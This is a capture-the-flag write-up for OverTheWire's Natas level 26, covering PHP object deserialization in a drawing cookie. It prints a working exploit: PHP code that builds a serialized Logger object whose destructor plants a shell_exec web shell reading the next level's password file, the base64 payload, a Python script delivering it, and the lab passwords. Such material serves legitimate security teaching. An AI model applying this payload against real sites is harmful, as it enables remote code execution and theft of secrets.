# Natas Level 26 Writeup (natas26) – OverTheWire

## Overview

This level focuses on exploiting **PHP object deserialization**.
The goal is to find the password for the next level.

## Observation

When we open the page, we see a page where we can draw lines by entering coordinates.

There is also a link to view the source code:

```text
index-source.html
```

The source code contains a `Logger` class:

```php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}
```

The application also unserializes the `drawing` cookie:

```php
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

## Finding the Password

### Using Browser & BurpSuite

1. The `drawing` cookie contains serialized PHP data.

2. Since the application uses `unserialize()`, we can provide a serialized `Logger` object instead of the normal drawing data.

3. We can modify the private `$logFile` property so that the destructor writes to the password file.

4. We create a base64-encoded serialized object with given PHP Code:

```php
<?php

class Logger{
    private $logFile;
    private $exitMsg;

    function __construct(){
        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/sbk77.php";
    }
}

$logger = new Logger();
echo base64_encode(serialize($logger));
?>
```

5. Now run this code on Online PHP compiler and change `drawing` cookies by output.
```txt
Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvc2JrNzcucGhwIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTk6Ijw/cGhwIGVjaG8gc2hlbGxfZXhlYygnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9
```

6. Then, Refresh the page and visit `img/sbk77.php` you found password for next level.

#### Proof

```text
mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
```

### Using Python

```python
import requests

target = 'http://natas26.natas.labs.overthewire.org'
auth = ('natas26', '3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT')

# base64-encoded PHP serialize payload
payload = "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvc2JrNzcucGhwIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTk6Ijw/cGhwIGVjaG8gc2hlbGxfZXhlYygnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9"

cookies = {"drawing": payload}

requests.get(target, auth=auth, cookies=cookies)

target = target + "/img/sbk77.php"

r = requests.get(target, auth=auth)
print(f'Password for next level is: {r.text.split("\n")[0]}')
```

## Vulnerability

The application uses `unserialize()` on user-controlled cookie data.

Because the `Logger` class has a `__destruct()` method that writes to `$logFile`, we can modify the serialized object and make it write to another file.

## Flag

`mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV`
